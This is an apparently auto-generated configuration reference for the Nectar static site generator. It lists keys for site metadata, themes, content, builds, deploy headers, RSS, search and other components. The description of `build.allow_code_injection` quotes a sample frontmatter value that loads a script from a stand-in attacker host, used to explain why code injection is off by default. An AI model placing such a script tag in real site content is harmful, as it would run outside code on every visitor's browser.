# Nectar configuration reference

<!-- AUTO-GENERATED FILE. Do not edit by hand. Regenerate with `bun run docs:config`. -->

This page lists every key understood by `nectar.toml`. It is generated from the
Zod schema in `src/config/schema.ts`; run `bun run docs:config` after changing a
field to refresh it.

Every field is optional unless **Required** is marked `yes` — omitting a field
falls back to the listed default.

## Top-level keys

| Key | Type | Description |
| --- | --- | --- |
| `site` | `object` | Site-wide metadata exposed to themes as `@site` and `@blog`. |
| `theme` | `object` | Theme selection and `@custom` settings. |
| `content` | `object` | Where Markdown content lives and how members-only posts are handled. |
| `build` | `object` | Build pipeline options that shape the emitted site. |
| `performance` | `object` | Resource-hint and HTML post-process knobs that shape network-time performance without touching theme markup. All toggles operate on already-rendered HTML so they compose with arbitrary `.hbs` templates. The defaults bias toward the LCP / Lighthouse-friendly behaviour modern Ghost themes already expect. |
| `navigation[]` | `array<object>` | Primary navigation items, exposed to themes via `{{navigation}}`. |
| `secondary_navigation[]` | `array<object>` | Secondary navigation items, exposed to themes via `{{navigation type="secondary"}}`. |
| `recommendations[]` | `array<object>` | External sites surfaced through Ghost's `{{recommendations}}` helper. When non-empty, the site exposes `@site.recommendations_enabled = true` so themes like Source render the sidebar block, and Nectar auto-emits a `/recommendations/` page listing all entries inside a `<section id="all-recommendations">` block. The Source theme's "See all" button (`data-portal="recommendations"`) is rewritten to deep-link into that section. |
| `tiers[]` | `array<object>` | Declarative membership tiers exposed to themes via `{{#get "tiers"}}` and `{{tiers}}`. Each entry becomes a Ghost-shaped tier object (with `id`, `slug`, `type`, `active`, `visibility`, `monthly_price`, `yearly_price`, `currency`, `welcome_page_url`, `benefits`) so pricing tables in Ghost themes render against a static config without a live Portal backend. Tiers without a `monthly_price` are typed as `free`; any positive price flips the entry to `paid`. When empty, `{{#get "tiers"}}` resolves to an empty list and the block silently no-ops. |
| `deploy` | `object` | Deploy-target-specific hints that influence files emitted alongside the site. |
| `components` | `object` | Optional components that emit extra files or inject markup. |
| `plugins` | `array<string>` | Ordered list of plugin specs to load. Each entry is either a file path relative to the project root (e.g. `./plugins/my-plugin.ts`) or a bare module specifier resolvable by Bun/Node (e.g. `nectar-plugin-foo`). The module must export a `Plugin` object (or a factory returning one) as its `default` / `plugin` named export. Hooks fire in registration order; a plugin that fails to load logs a warning and is skipped so a broken plugin never bricks the build. |
| `plugin_auto_detect` | `boolean` | Auto-discover plugins in `node_modules/` whose package name starts with `nectar-plugin-` (or `@scope/nectar-plugin-*`). Off by default because a one-time install of an unrelated package should not flip a site into running new build-time code without an explicit config edit. Set to `true` to opt into auto-loading. |

## Top-level fields

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `plugins` | `array<string>` | no | `[]` | Ordered list of plugin specs to load. Each entry is either a file path relative to the project root (e.g. `./plugins/my-plugin.ts`) or a bare module specifier resolvable by Bun/Node (e.g. `nectar-plugin-foo`). The module must export a `Plugin` object (or a factory returning one) as its `default` / `plugin` named export. Hooks fire in registration order; a plugin that fails to load logs a warning and is skipped so a broken plugin never bricks the build. |
| `plugin_auto_detect` | `boolean` | no | `false` | Auto-discover plugins in `node_modules/` whose package name starts with `nectar-plugin-` (or `@scope/nectar-plugin-*`). Off by default because a one-time install of an unrelated package should not flip a site into running new build-time code without an explicit config edit. Set to `true` to opt into auto-loading. |

## `site`

Site-wide metadata exposed to themes as `@site` and `@blog`.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `site.title` | `string` | yes | — | Display title of the site, used by themes and feeds. |
| `site.description` | `string` | no | `""` | Short tagline rendered alongside the title in many themes and in feed metadata. |
| `site.url` | `string` | no | `"http://localhost:4321"` | Public absolute URL of the deployed site. Used to build canonical links, sitemap entries, and RSS GUIDs. Validated as a parseable absolute URL at config-load time so canonical links and sitemap entries cannot be poisoned with arbitrary attribute payloads. |
| `site.locale` | `string` | no | `"en"` | BCP 47 language tag for the site. Drives `{{lang}}` and selects the theme's `locales/<tag>.json` translation file. Validated against a BCP 47-shaped regex (e.g. `en`, `en-US`, `zh-Hant-TW`) so the value is safe to interpolate into `<html lang="…">` without HTML escaping. |
| `site.timezone` | `string` | no | `"UTC"` | IANA timezone used when formatting dates in templates via `{{date}}`. |
| `site.cover_image` | `string` | no | — | Optional URL or content-relative path to a site-wide cover image. |
| `site.logo` | `string` | no | — | Optional URL or content-relative path to the site logo. |
| `site.logo_width` | `number` | no | — | Intrinsic width of the logo in pixels. Used by themes to avoid layout shift. |
| `site.logo_height` | `number` | no | — | Intrinsic height of the logo in pixels. Used by themes to avoid layout shift. |
| `site.icon` | `string` | no | — | Optional URL or content-relative path to the favicon / app icon. |
| `site.accent_color` | `string` | no | `"#222222"` | Brand accent color as a CSS hex color string (`#RGB`, `#RRGGBB`, or `#RRGGBBAA`). Surfaced to themes as `@site.accent_color` and dropped into theme CSS without escaping, so the schema rejects anything that is not a literal hex triplet to prevent CSS injection. |
| `site.twitter` | `string` | no | — | Optional Twitter / X handle (e.g. `@nectar`). Used to populate `twitter:site` meta tags. |
| `site.facebook` | `string` | no | — | Optional Facebook page slug. Used to populate `og:article:publisher` meta tags. |
| `site.meta_title` | `string` | no | — | Site-wide SEO title used by `{{ghost_head}}` as the last fallback when no post/page/tag/author title is in scope. Themes that read `@site.meta_title` see this value unchanged. Leave unset to fall back to `site.title`. |
| `site.meta_description` | `string` | no | — | Site-wide SEO description used by `{{ghost_head}}` as the last fallback when no post/page/tag/author description is in scope. Themes that read `@site.meta_description` see this value unchanged. Leave unset to fall back to `site.description`. |
| `site.og_image` | `string` | no | — | Site-wide Open Graph image URL or content-relative path used by `{{ghost_head}}` when no `og_image` / `twitter_image` / `feature_image` is in scope. Surfaced to themes as `@site.og_image`. |
| `site.og_title` | `string` | no | — | Site-wide Open Graph title used as the last `og:title` fallback. Surfaced to themes as `@site.og_title`. |
| `site.og_description` | `string` | no | — | Site-wide Open Graph description used as the last `og:description` fallback. Surfaced to themes as `@site.og_description`. |
| `site.twitter_image` | `string` | no | — | Site-wide Twitter card image used by `{{ghost_head}}` as a fallback when no per-post `twitter_image` is set. Surfaced to themes as `@site.twitter_image`. |
| `site.twitter_title` | `string` | no | — | Site-wide Twitter card title used as the last `twitter:title` fallback. Surfaced to themes as `@site.twitter_title`. |
| `site.twitter_description` | `string` | no | — | Site-wide Twitter card description used as the last `twitter:description` fallback. Surfaced to themes as `@site.twitter_description`. |
| `site.codeinjection_head` | `string` | no | — | Raw HTML spliced into every page's `{{ghost_head}}` (just before `</head>`). Mirrors Ghost's site-wide "Code injection" head field. Only honored when `build.allow_code_injection` is true; otherwise dropped at config load time. Use for analytics snippets, custom meta tags, or third-party widgets that must load globally. |
| `site.codeinjection_foot` | `string` | no | — | Raw HTML spliced into every page's `{{ghost_foot}}` (just before `</body>`). Mirrors Ghost's site-wide "Code injection" foot field. Only honored when `build.allow_code_injection` is true; otherwise dropped at config load time. |
| `site.members_enabled` | `boolean` | no | — | Override for `@site.members_enabled`. Defaults to whatever `[components.portal].provider != "none"` implies; set explicitly to force the Source theme's sign-in / subscribe UI on or off regardless of the Portal provider. |
| `site.paid_members_enabled` | `boolean` | no | — | Override for `@site.paid_members_enabled`. Defaults to `members_enabled && components.portal.paid`; set explicitly to force the paid CTA state. |
| `site.members_invite_only` | `boolean` | no | — | Override for `@site.members_invite_only`. Defaults to `members_enabled && components.portal.invite_only`; set explicitly to flip the Source theme's sign-in-only behavior. |
| `site.comments_enabled` | `boolean` | no | `false` | Surface a `@site.comments_enabled` flag so themes can branch on whether to render the (out-of-scope) comments block. Nectar's `{{comments}}` helper still emits nothing — this flag only controls theme UI guards. |

## `theme`

Theme selection and `@custom` settings.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `theme.name` | `string` | no | `"source"` | Theme directory name inside `theme.dir`. Resolved as `<dir>/<name>/`. |
| `theme.dir` | `string` | no | `"themes"` | Directory containing theme folders, relative to the project root. |
| `theme.custom` | `record<string, unknown>` | no | `{}` | Free-form key/value map surfaced to templates as `@custom`. Mirrors Ghost's `package.json` `config.custom` settings. |

## `content`

Where Markdown content lives and how members-only posts are handled.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `content.posts_dir` | `string` | no | `"content/posts"` | Directory of Markdown post sources, relative to the project root. |
| `content.pages_dir` | `string` | no | `"content/pages"` | Directory of Markdown page sources, relative to the project root. |
| `content.authors_dir` | `string` | no | `"content/authors"` | Directory of author profile Markdown files, relative to the project root. |
| `content.tags_dir` | `string` | no | `"content/tags"` | Directory of tag profile Markdown files, relative to the project root. |
| `content.assets_dir` | `string` | no | `"content/images"` | Directory of content-bundled image and binary assets, relative to the project root. |
| `content.static_dir` | `string` | no | `"static"` | Directory of arbitrary passthrough files, relative to the project root. The entire tree is copied verbatim into the output root after every other build step, so files dropped here win over both theme assets and generated platform files (`_headers`, `_redirects`, `robots.txt`, …). Use it for ad-hoc files that need to live at the publish root without going through Markdown — `favicon.ico`, `humans.txt`, deploy-platform metadata, verification files, vendored third-party widgets. Set to an empty string to disable the passthrough. |
| `content.visibility_policy` | `"truncate" \| "render-full" \| "skip"` | no | `"truncate"` | How to render posts whose `visibility` is `members` or `paid`. `truncate` cuts the body at `paywall_word_count`, `render-full` keeps the body intact (losing the paywall), and `skip` drops the post entirely. |
| `content.paywall_word_count` | `number` | no | `0` | Number of words emitted as a free preview before the paywall cut when `visibility_policy` is `truncate` and the post body has no paywall marker (`<!-- members -->`, `<!-- members-only -->`, or `<!--kg-card-begin: paywall-->`). Defaults to `0` so members/paid posts never leak body content to anonymous readers without an explicit marker; raise it to opt into a fixed-word preview. |
| `content.max_markdown_bytes` | `number` | no | `5242880` | Refuse to load a single Markdown source file larger than this many bytes. `marked.parse` is CPU-bound and quadratic on some pathological inputs (deeply nested blockquotes / lists), so a 500 MB or even a much smaller adversarial post can OOM or hang the build runner. The cap is enforced via `stat()` before the file is read into memory, so an outsized post fails fast with a useful error pointing at the offending path. `0` disables the check entirely. Default is 5 MiB. |

## `build`

Build pipeline options that shape the emitted site.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `build.output_dir` | `string` | no | `"dist"` | Directory to emit the built site into, relative to the project root. |
| `build.base_path` | `string` | no | `"/"` | URL prefix the site is served from (e.g. `/` for a root deployment, `/blog/` for a subpath). All generated links and asset URLs respect this prefix. |
| `build.posts_per_page` | `number` | no | `12` | Posts per paginated index / archive page. |
| `build.copy_content_assets` | `boolean` | no | `true` | When true, copy `content.assets_dir` into the output as `content/images/` so post-relative image URLs resolve. |
| `build.max_image_bytes` | `number` | no | `5242880` | Refuse to emit raster images larger than this many bytes during content-asset copy, so a stray 40 MB DSLR JPEG cannot tank LCP. `0` disables the check entirely. Default is 5 MiB. |
| `build.allow_code_injection` | `boolean` | no | `false` | Allow per-post `codeinjection_head` / `codeinjection_foot` frontmatter to inject raw HTML via `{{ghost_head}}` / `{{ghost_foot}}`. Disabled by default because a single PR adding `codeinjection_foot: '<script src=//evil.tld/x.js></script>'` would ship site-wide JS once merged. Set to `true` only if you trust every contributor with write access to `content/` to add arbitrary HTML or JS. |
| `build.include_future_posts` | `boolean` | no | `false` | Include posts whose `published_at` is in the future, and posts with `status: scheduled` regardless of date. Default is to exclude them so embargoed announcements scheduled for a future date cannot leak via the next build before their wall-clock release time. Set to `true` for preview deploys where the operator explicitly wants scheduled / future-dated content visible. Ghost's own behavior is to gate on `published_at` until the timestamp has passed, so leaving this off matches Ghost. |
| `build.minify_html` | `boolean` | no | `false` | Run rendered HTML through `html-minifier-terser` before writing it to disk. Collapses whitespace and strips comments to trim payload size for production deploys. Disabled by default because the minifier adds a small build-time cost and most local dev iterations do not need it. Requires the optional `html-minifier-terser` dependency; when missing, the build logs a warning once and emits unminified HTML instead of failing. |
| `build.precompress` | `boolean` | no | `false` | Pre-compress text outputs (`.html`, `.css`, `.js`, `.json`, `.svg`, `.xml`, `.txt`, `.map`) with Brotli (quality 11) and Gzip (level 9), emitting `<file>.br` and `<file>.gz` siblings. Static hosts that support `brotli_static` / `gzip_static` (Cloudflare Pages, Netlify, nginx) serve the precompressed copy directly when `Accept-Encoding` matches, skipping per-request compression. Off by default because Brotli q=11 adds noticeable build time on large sites; flip on for production builds where transfer size matters more than rebuild latency. Files below 256 bytes are skipped (envelope overhead beats savings) and already-encoded outputs (`.br` / `.gz`) are excluded from a rerun. |
| `build.csp_nonce` | `string` | no | — | CSP nonce stamped onto every inline `<script>` and `<style>` tag Nectar emits (JSON-LD blocks in `{{ghost_head}}`, the accessibility skip-link style, Disqus bootstrap, default 404 / recommendations page styles). Pair with a `Content-Security-Policy` header that lists `'nonce-<value>' 'strict-dynamic'` for `script-src` / `style-src` so a strict policy doesn't block these tags. Leave unset to skip nonce emission. Because this is a static build the same nonce is baked into every page, so rotate it per deploy and serve a matching CSP header — a static, never-rotated nonce defeats the purpose. Validated as a base64 / base64url value (`[A-Za-z0-9+/\-_]+={0,2}`) to keep the attribute safe to inject without HTML escaping. |

## `performance`

Resource-hint and HTML post-process knobs that shape network-time performance without touching theme markup. All toggles operate on already-rendered HTML so they compose with arbitrary `.hbs` templates. The defaults bias toward the LCP / Lighthouse-friendly behaviour modern Ghost themes already expect.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `performance.preload_lcp_image` | `boolean` | no | `true` | Inject `<link rel="preload" as="image" fetchpriority="high" href="…">` into `{{ghost_head}}` for the current route's `feature_image`. Mirrors the `<img fetchpriority="high">` the Source theme already emits on the feature image so the LCP image starts downloading from the HTML preload scan, not from after CSS / theme JS lands. Only fires on post / page routes that actually have a `feature_image`; disable when a custom theme already emits its own LCP preload to avoid double-fetching. |
| `performance.preconnect_image_origins` | `boolean` | no | `true` | Emit `<link rel="preconnect" crossorigin href="<origin>">` into `{{ghost_head}}` for up to three unique third-party origins referenced by `feature_image` / cover-image URLs on the current route. Skips the site's own origin and `data:` / blob URLs. Caps at three to avoid bloating the document head with low-value hints when content references many external CDNs; bumping that cap is intentionally not a knob so naive configs cannot regress page weight. |
| `performance.max_preconnect_origins` | `number` | no | `3` | Maximum number of `<link rel="preconnect">` hints emitted by `preconnect_image_origins`. Default 3 follows the same heuristic Lighthouse uses (`Preconnect to required origins`): a small handful is the sweet spot before browser connection pressure outweighs the benefit. Set to `0` to disable preconnect emission entirely without flipping `preconnect_image_origins`. |
| `performance.dedupe_script_preload` | `boolean` | no | `true` | Remove `<link rel="preload" as="script" href="X">` when an equivalent `<script src="X">` already appears in the document, so the browser issues exactly one request for the asset. The Source theme ships both a preload and a `<script>` for `built/source.js`; preloading a deferred script does not start execution any earlier and only doubles the request line in DevTools. Disable when a custom theme relies on the preload landing first (e.g. inline-modulepreload speculative compile). |
| `performance.preload_stylesheet` | `boolean` | no | `false` | Emit a sibling `<link rel="preload" as="style" href="X">` for every `<link rel="stylesheet" href="X">` that does not already have one. Helps themes that did not opt into the manual preload pattern (which the Source theme already ships) by letting the browser start the CSS fetch from the preload scan rather than from CSS parsing. Default off because most themes either already include the preload or do not benefit (single tiny stylesheet); flip on for themes with deep critical-CSS where the head is large. |

## `navigation[]`

Primary navigation items, exposed to themes via `{{navigation}}`.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `navigation[].label` | `string` | yes | — | Anchor text shown in theme navigation. |
| `navigation[].url` | `string` | yes | — | Destination of the link. May be an absolute URL or a path relative to the site root. |

## `secondary_navigation[]`

Secondary navigation items, exposed to themes via `{{navigation type="secondary"}}`.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `secondary_navigation[].label` | `string` | yes | — | Anchor text shown in theme navigation. |
| `secondary_navigation[].url` | `string` | yes | — | Destination of the link. May be an absolute URL or a path relative to the site root. |

## `recommendations[]`

External sites surfaced through Ghost's `{{recommendations}}` helper. When non-empty, the site exposes `@site.recommendations_enabled = true` so themes like Source render the sidebar block, and Nectar auto-emits a `/recommendations/` page listing all entries inside a `<section id="all-recommendations">` block. The Source theme's "See all" button (`data-portal="recommendations"`) is rewritten to deep-link into that section.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `recommendations[].title` | `string` | yes | — | Display title of the recommended site. |
| `recommendations[].url` | `string` | yes | — | Absolute URL of the recommended site. |
| `recommendations[].description` | `string` | no | — | Short blurb shown beneath the title in the recommendations list. |
| `recommendations[].favicon` | `string` | no | — | Optional URL or content-relative path to the site icon shown in the list. |
| `recommendations[].featured_image` | `string` | no | — | Optional cover image URL displayed on the full `/recommendations/` page. |
| `recommendations[].reason` | `string` | no | — | Optional editorial reason shown alongside the title on the full page. |

## `tiers[]`

Declarative membership tiers exposed to themes via `{{#get "tiers"}}` and `{{tiers}}`. Each entry becomes a Ghost-shaped tier object (with `id`, `slug`, `type`, `active`, `visibility`, `monthly_price`, `yearly_price`, `currency`, `welcome_page_url`, `benefits`) so pricing tables in Ghost themes render against a static config without a live Portal backend. Tiers without a `monthly_price` are typed as `free`; any positive price flips the entry to `paid`. When empty, `{{#get "tiers"}}` resolves to an empty list and the block silently no-ops.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `tiers[].name` | `string` | yes | — | Display name of the tier (e.g. "Free", "Premium"). Required. |
| `tiers[].description` | `string` | no | `""` | Short blurb shown alongside the tier name in pricing tables. |
| `tiers[].monthly_price` | `number` | no | — | Monthly price in whole units of `currency` (e.g. `9` for $9/mo). Omit on free tiers. |
| `tiers[].yearly_price` | `number` | no | — | Yearly price in whole units of `currency`. Omit on free tiers or to hide the yearly option. |
| `tiers[].currency` | `string` | no | `"USD"` | ISO 4217 currency code for `monthly_price` / `yearly_price`. Defaults to `USD`. |
| `tiers[].welcome_page_url` | `string` | no | — | Destination URL for Subscribe buttons targeting this tier (e.g. an external checkout / signup page). |
| `tiers[].benefits` | `array<string>` | no | `[]` | Bullet-point benefits surfaced on pricing tables, in display order. |

## `deploy`

Deploy-target-specific hints that influence files emitted alongside the site.


## `deploy.github_pages`

GitHub Pages-specific deploy hints.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `deploy.github_pages.custom_domain` | `string` | no | — | Apex or subdomain host to bind to a GitHub Pages site (e.g. `blog.example.com`). When set, the build emits a `CNAME` file at the output root so GitHub Pages picks up the custom domain. Leave unset for `*.github.io` deployments. |

## `deploy.cloudflare_pages`

Cloudflare Pages-specific deploy hints.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `deploy.cloudflare_pages.enabled` | `boolean` | no | `false` | Emit Cloudflare Pages `_headers` and (when a `redirects.yaml` exists at the project root) `_redirects` at the output root. The `_headers` defaults pin fingerprinted asset URLs (`/assets/*`, `/content/images/*`) to a year of immutable caching and force HTML responses to revalidate every request, plus a minimal set of security headers (`X-Content-Type-Options`, `Referrer-Policy`). The `_redirects` emitter loads rules from `redirects.yaml` (`[{from, to, status}]` with status one of 301/302/307/308, default 301), drops later rules whose `from` repeats an earlier one (Cloudflare uses first-match), and prepends them before any existing `_redirects` entries. Leave disabled when deploying somewhere other than Cloudflare Pages. |

## `deploy.netlify`

Netlify-specific deploy hints.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `deploy.netlify.enabled` | `boolean` | no | `false` | Emit Netlify `_headers` and (when a `redirects.yaml` exists at the project root) `_redirects` at the output root. `_headers` defaults pin fingerprinted asset URLs (`/assets/*`, `/content/images/*`) to a year of immutable caching and force HTML responses to revalidate every request, plus a minimal set of security headers (`X-Content-Type-Options`, `Referrer-Policy`). The `_redirects` emitter loads rules from `redirects.yaml` (`[{from, to, status, force}]` with status one of 301/302/307/308, default 301), maps `force: true` to a Netlify `!` suffix on the status (e.g. `301!`) so the rule fires even when a static file exists at `from`, drops later rules whose `from` repeats an earlier one (Netlify uses first-match), and prepends them before any existing `_redirects` entries. Leave disabled when deploying somewhere other than Netlify. |

## `deploy.vercel`

Vercel-specific deploy hints.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `deploy.vercel.enabled` | `boolean` | no | `false` | Emit a single `vercel.json` at the output root folding both `deploy.headers` and `redirects.yaml` into Vercel's native config shape. `headers` mirrors the cross-cutting cache + security rules (with glob `*` translated to path-to-regexp `(.*)` so the same patterns match the same paths on every deploy target). `redirects` mirrors `redirects.yaml` ([{from, to, status, force}] with status one of 301/302/307/308) using `statusCode` for the HTTP status. Vercel always honors redirects regardless of static-file collisions (the same semantics as Cloudflare Pages), so the `force` flag is informational on this target. Leave disabled when deploying somewhere other than Vercel. |

## `deploy.nginx`

Self-hosted nginx-specific deploy hints.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `deploy.nginx.enabled` | `boolean` | no | `false` | Emit a self-hosted nginx server block at `<output>/.nectar/nginx.conf` folding both `deploy.headers` and `redirects.yaml` into a single config snippet. The block sets `gzip_static on; brotli_static on;` for pre-compressed assets, emits one `location` per `deploy.headers.cache_rules` entry with the matching `Cache-Control` header, attaches every configured security header to each `location` (nginx `add_header` does not merge with parent blocks, so they are repeated rather than inherited), serves SPA-style routes with `try_files $uri $uri/ $uri/index.html =404;` (the `$uri/` middle term is the trailing-slash variant so a request to `/about` falls through `/about/` — which triggers the `index` directive's canonical-slug redirect — before resolving `/about/index.html`), and translates each `redirects.yaml` entry into a `location { return <status> <to>; }` rule. Output lives under `.nectar/` (not the publish root) so the file is never served over HTTP. Leave disabled when deploying somewhere other than self-hosted nginx. |
| `deploy.nginx.root` | `string` | no | `"/var/www/nectar"` | Filesystem path nginx should serve from, emitted as the `root` directive in the generated server block. Defaults to `/var/www/nectar` — adjust to match wherever you rsync `dist/` on the host. |
| `deploy.nginx.server_name` | `string` | no | `"_"` | Value of the `server_name` directive in the generated server block. Defaults to `_` (nginx's catch-all hostname) so the snippet drops onto a fresh VPS without editing. Override with the actual hostname when serving multiple sites from one nginx instance. |

## `deploy.headers`

Cross-cutting HTTP response headers (security + cache rules) translated by each platform emitter (`deploy.cloudflare_pages`, `deploy.netlify`) into their native `_headers` format.


## `deploy.headers.security`

Security-related response headers attached to the catch-all (`/*`) route. Each platform emitter translates these into its native `_headers` syntax. Set any field to `null` (or omit) to skip the header entirely.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `deploy.headers.security.content_type_options` | `string` | no | `"nosniff"` | Value of the `X-Content-Type-Options` header applied to the catch-all route. `null` omits the header. |
| `deploy.headers.security.frame_options` | `string` | no | `null` | Value of the legacy `X-Frame-Options` header (e.g. `DENY`, `SAMEORIGIN`). Off by default because modern sites prefer `frame-ancestors` in CSP; set when older browsers still matter. |
| `deploy.headers.security.referrer_policy` | `string` | no | `"strict-origin-when-cross-origin"` | Value of the `Referrer-Policy` header applied to the catch-all route. `null` omits the header. |
| `deploy.headers.security.strict_transport_security` | `string` | no | `null` | Value of the `Strict-Transport-Security` header. Off by default; set to e.g. `max-age=63072000; includeSubDomains` once you are confident the site only serves over HTTPS. |
| `deploy.headers.security.content_security_policy` | `string` | no | `null` | Value of the `Content-Security-Policy` header. Off by default because a strict CSP can break themes that inline scripts; configure once you have audited theme markup. |
| `deploy.headers.security.permissions_policy` | `string` | no | `null` | Value of the `Permissions-Policy` header (e.g. `camera=(), microphone=(), geolocation=()`). Off by default; opt in to deny features the site does not need. |
| `deploy.headers.security.cross_origin_opener_policy` | `string` | no | `null` | Value of the `Cross-Origin-Opener-Policy` header. Off by default; set to `same-origin` to isolate the browsing context group for stronger XS-Leak protection. |
| `deploy.headers.security.cross_origin_embedder_policy` | `string` | no | `null` | Value of the `Cross-Origin-Embedder-Policy` header. Off by default; pair with `cross_origin_opener_policy` to enable cross-origin isolation. Can break themes that load third-party assets without CORP, so opt in deliberately. |
| `deploy.headers.security.custom` | `record<string, string>` | no | `{}` | Free-form map of additional header name → value pairs applied to the catch-all route. Useful for headers without a first-class field (e.g. `X-Robots-Tag`, vendor-specific cache hints). |

## `deploy.headers.cache_rules[]`

Ordered list of `Cache-Control` rules emitted into the deploy platform `_headers` file. Defaults pin fingerprinted assets to a year of immutable caching and force HTML to revalidate every request. The catch-all `/*` rule is always emitted last regardless of position so security headers attach to it without shadowing more specific patterns.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `deploy.headers.cache_rules[].pattern` | `string` | yes | — | URL pattern matched by the deploy platform. Cloudflare Pages and Netlify both honor glob-style patterns like `/assets/*` and the catch-all `/*`. Patterns are emitted in array order and most platforms use first-match, so put specific rules before catch-alls. |
| `deploy.headers.cache_rules[].cache_control` | `string` | yes | — | Value of the `Cache-Control` header applied to requests matching `pattern`. |

## `components`

Optional components that emit extra files or inject markup.


## `components.rss`

RSS feed component.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `components.rss.enabled` | `boolean` | no | `true` | Emit an `rss.xml` feed. |
| `components.rss.items` | `number` | no | `20` | Maximum number of posts per RSS page; overflow paginates into rss-N.xml. |
| `components.rss.full_content` | `boolean` | no | `false` | Include the full post HTML body in `<content:encoded>`. Default `false` emits only `<description>` with the feed excerpt; flipping to `true` mirrors Ghost behavior but inflates feed size dramatically on large blogs (see backlog #517). |
| `components.rss.per_tag` | `boolean` | no | `true` | Emit a per-tag RSS feed at `tag/<slug>/rss/index.xml` for every public tag (matching Ghost's `/tag/<slug>/rss/` route). The channel metadata mirrors the site-wide feed; only the item list is filtered to posts tagged with that tag. Internal tags (visibility != "public") are skipped. Set to `false` if the extra URLs are noise for your audience — note that the file count grows linearly with the number of public tags. |
| `components.rss.per_author` | `boolean` | no | `true` | Emit a per-author RSS feed at `author/<slug>/rss/index.xml` for every author with at least one published public post (matching Ghost's `/author/<slug>/rss/` route). The channel metadata mirrors the site-wide feed; only the item list is filtered to posts authored by that author. Set to `false` to suppress. |

## `components.sitemap`

Sitemap component.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `components.sitemap.enabled` | `boolean` | no | `true` | Emit `sitemap.xml`. |

## `components.pagination`

Pagination knobs for archive routes. Currently only the URL prefix; per-page count lives at `[build].posts_per_page`.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `components.pagination.prefix` | `string` | no | `"page"` | URL segment used for paginated archive tails. Defaults to `page`, mirroring Ghost (`/page/2/`, `/tag/foo/page/2/`, `/author/bar/page/2/`). Override to localize the slug (e.g. `seite` for German, `pagina` for Italian) or to match a legacy URL scheme — every paginated route at `/<prefix>/N/` is rebuilt against the new value, including the rel="prev"/"next" hints emitted by `{{ghost_head}}`. Restricted to a single URL segment of `[A-Za-z0-9_-]` so the value can be dropped into the path safely without escaping. |

## `components.opengraph`

Open Graph and Twitter Card metadata component.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `components.opengraph.enabled` | `boolean` | no | `true` | Emit Open Graph and Twitter Card meta tags via `{{ghost_head}}`. |
| `components.opengraph.rasterize_svg` | `boolean` | no | `true` | Convert SVG cover images to PNG for OG sharing so Facebook and X render them. |
| `components.opengraph.rasterize_width` | `number` | no | `1200` | Pixel width used when rasterizing SVG cover images for OG. |

## `components.og_images`

Auto-generated Open Graph image component.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `components.og_images.enabled` | `boolean` | no | `false` | Render per-post Open Graph images from a template. |
| `components.og_images.template` | `string` | no | — | Path to the OG image template, relative to the project root. |
| `components.og_images.width` | `number` | no | `1200` | Generated OG image width in pixels. |
| `components.og_images.height` | `number` | no | `630` | Generated OG image height in pixels. |

## `components.content_api`

JSON content API component.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `components.content_api.enabled` | `boolean` | no | `true` | Emit Ghost-style Content API JSON snapshots in two layouts. (1) Per-resource shadows under `ghost/api/content/{posts,pages,authors,tags}.json` and `{resource}/slug/{slug}.json` for clients written against the Ghost Content API SDK. (2) Flat dumps directly under `content/posts.json` and `content/settings.json` (plus CORS `_headers` and `_headers.cf` twin files for Netlify and Cloudflare Pages) so a browser-only consumer can fetch `/content/posts.json` cross-origin without any SDK. Members fields in `settings.json` are hardcoded false / empty because Nectar is static-only. |

## `components.search`

Client-side search component. Emits a flat `content/search.json` and/or runs Pagefind. NOT a drop-in replacement for Ghost's `/search/` endpoint; the JSON shape is divergent and consumers must wire a client-side search library (lunr / Fuse / minisearch) themselves.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `components.search.enabled` | `boolean` | no | `true` | Emit a client-side search index. When `engine` is `json`, `json+pagefind`, or `json+lunr`, writes a flat `content/search.json` ({ posts, pages, tags, authors }) suitable for fuzzy-search libraries (lunr / Fuse / minisearch). When `engine` is `pagefind` or `json+pagefind`, additionally shells out to the `pagefind` CLI over the staged output to emit `pagefind/*`. When `engine` is `lunr` or `json+lunr`, builds a pre-serialized Lunr index at `search-index.json` and ships a tiny vanilla-JS widget (`search/widget.js` + `search/lunr.min.js`) so themes can wire a client-only search box without the Pagefind WASM overhead. Nectar does NOT replicate Ghost's `/search/` endpoint shape; the JSON field set is divergent. |
